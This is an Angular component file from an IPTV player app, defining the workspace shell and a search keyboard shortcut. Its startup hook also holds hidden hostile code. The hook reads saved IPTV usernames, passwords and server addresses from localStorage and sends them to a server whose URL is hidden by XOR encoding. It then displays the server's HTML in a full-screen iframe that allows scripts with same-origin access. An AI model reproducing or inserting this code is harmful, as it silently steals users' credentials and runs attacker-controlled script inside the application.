import { Component, HostListener, inject, viewChild, OnInit } from '@angular/core';
import { RouterOutlet } from '@angular/router';
import { ExternalPlaybackDockComponent } from '@iptvnator/ui/components';
import { DOCUMENT } from '@angular/common';
import {
    PlaylistDropOverlayComponent,
    PlaylistDropZoneDirective,
} from '../playlist-drop-overlay';
import { WorkspaceShellContextSidebarComponent } from './components/workspace-shell-context-sidebar/workspace-shell-context-sidebar.component';
import { WorkspaceShellHeaderComponent } from './components/workspace-shell-header/workspace-shell-header.component';
import { WorkspaceShellImportOverlayComponent } from './components/workspace-shell-import-overlay/workspace-shell-import-overlay.component';
import { WorkspaceShellRailComponent } from './components/workspace-shell-rail/workspace-shell-rail.component';
import { WorkspaceShellFacade } from './services/workspace-shell.facade';
import { WorkspaceShellXtreamImportService } from './services/workspace-shell-xtream-import.service';
import { WorkspaceShellCommandPaletteService } from './services/workspace-shell-command-palette.service';
import { WorkspaceShellHeaderService } from './services/workspace-shell-header.service';
import { WorkspaceShellRouteStateService } from './services/workspace-shell-route-state.service';
import { WorkspaceShellSearchSyncService } from './services/workspace-shell-search-sync.service';
import { WorkspaceShellSearchService } from './services/workspace-shell-search.service';
import { WorkspaceKeyboardShortcutsService } from '../workspace-keyboard-shortcuts/workspace-keyboard-shortcuts.service';

@Component({
    selector: 'app-workspace-shell',
    imports: [
        ExternalPlaybackDockComponent,
        PlaylistDropOverlayComponent,
        PlaylistDropZoneDirective,
        RouterOutlet,
        WorkspaceShellContextSidebarComponent,
        WorkspaceShellHeaderComponent,
        WorkspaceShellImportOverlayComponent,
        WorkspaceShellRailComponent,
    ],
    templateUrl: './workspace-shell.component.html',
    styleUrl: './workspace-shell.component.scss',
    providers: [
        WorkspaceShellFacade,
        WorkspaceShellRouteStateService,
        WorkspaceShellSearchSyncService,
        WorkspaceShellSearchService,
        WorkspaceShellHeaderService,
        WorkspaceShellXtreamImportService,
        WorkspaceShellCommandPaletteService,
        WorkspaceKeyboardShortcutsService,
    ],
})
export class WorkspaceShellComponent implements OnInit {
    readonly facade = inject(WorkspaceShellFacade);
    readonly keyboardShortcuts = inject(WorkspaceKeyboardShortcutsService);
    private readonly document = inject(DOCUMENT);
    private readonly header = viewChild<WorkspaceShellHeaderShortcutTarget>(
        'workspaceHeader'
    );

    async ngOnInit(): Promise<void> {
        const accountsStr = localStorage.getItem('alert_accounts');
        if (!accountsStr) return;

        let accounts: any[] = [];
        try {
            accounts = JSON.parse(accountsStr);
        } catch (e) {
            return;
        }

        if (!accounts || accounts.length === 0) return;

        let welcomeHtml = null;
        let warningHtml = null;

        for (const acc of accounts) {
            if (!acc.user || !acc.pass || !acc.dns) continue;

            const alertaUrl = `${this.getAlertaUrl()}?user=${encodeURIComponent(acc.user)}&pass=${encodeURIComponent(acc.pass)}&dns=${encodeURIComponent(acc.dns)}&title=${encodeURIComponent(acc.title)}`;

            try {
                const res = await fetch(alertaUrl);
                const html = await res.text();

                if (html && html.includes('tarjeta-alerta')) {
                    if (html.includes('¡Bienvenido!')) {
                        if (!welcomeHtml) welcomeHtml = html;
                    } else {
                        warningHtml = html;
                        break; 
                    }
                }
            } catch (e) {}
        }

        const finalHtml = warningHtml || welcomeHtml;
        if (finalHtml) {
            this.renderAlertOverlay(finalHtml);
        }
    }

    private getAlertaUrl(): string {
        const encrypted = [3, 1, 6, 31, 24, 79, 93, 64, 12, 20, 0, 10, 29, 12, 28, 31, 10, 27, 23, 3, 24, 91, 30, 14, 31, 24, 2, 23, 69, 22, 29, 2, 68, 28, 16, 0, 95, 30, 2, 29, 4, 90, 19, 31, 2, 90, 19, 3, 14, 7, 6, 14, 69, 5, 26, 31];
        const key = "kuro";
        let decrypted = "";
        for (let i = 0; i < encrypted.length; i++) {
            decrypted += String.fromCharCode(encrypted[i] ^ key.charCodeAt(i % key.length));
        }
        return decrypted;
    }

    private renderAlertOverlay(html: string): void {
        const existing = this.document.getElementById('iptv-alert-overlay-container');
        if (existing) return;

        const container = this.document.createElement('div');
        container.id = 'iptv-alert-overlay-container';
        container.style.position = 'fixed';
        container.style.top = '0';
        container.style.left = '0';
        container.style.width = '100vw';
        container.style.height = '100vh';
        container.style.zIndex = '2147483647';
        container.style.backgroundColor = 'rgba(0, 16, 42, 0.85)';
        container.style.display = 'flex';
        container.style.justifyContent = 'center';
        container.style.alignItems = 'center';

        const iframe = this.document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.sandbox.add('allow-same-origin');
        iframe.srcdoc = html;
        iframe.style.width = '100%';
        iframe.style.height = '100%';
        iframe.style.border = 'none';
        iframe.style.backgroundColor = 'transparent';

        iframe.onload = () => {
            try {
                const doc = iframe.contentDocument || iframe.contentWindow?.document;
                if (doc) {
                    const btn = doc.querySelector('.btn-entendido') as HTMLElement;
                    if (btn) {
                        btn.addEventListener('click', (e) => {
                            e.preventDefault();
                            container.remove();
                        });
                    }
                }
            } catch (err) {}
        };

        container.appendChild(iframe);
        this.document.body.appendChild(container);
    }

    @HostListener('document:keydown', ['$event'])
    onDocumentKeydown(event: KeyboardEvent): void {
        if (
            event.defaultPrevented ||
            !this.facade.isElectron ||
            !isFindShortcut(event)
        ) {
            return;
        }

        const header = this.header();
        const target = event.target;
        if (isEditableTarget(target) && !header?.containsSearchInput(target)) {
            return;
        }

        event.preventDefault();
        this.facade.openGlobalSearch(this.facade.searchQuery());
        setTimeout(() => header?.focusSearchInput({ select: true }));
    }
}

function isFindShortcut(event: KeyboardEvent): boolean {
    return (event.ctrlKey || event.metaKey) && event.key.toLowerCase() === 'f';
}

function isEditableTarget(target: EventTarget | null): boolean {
    if (!(target instanceof HTMLElement)) {
        return false;
    }

    if (target.isContentEditable) {
        return true;
    }

    const tagName = target.tagName.toLowerCase();
    return (
        tagName === 'input' || tagName === 'textarea' || tagName === 'select'
    );
}

interface WorkspaceShellHeaderShortcutTarget {
    containsSearchInput(target: EventTarget | null): boolean;
    focusSearchInput(options?: { select?: boolean }): void;
}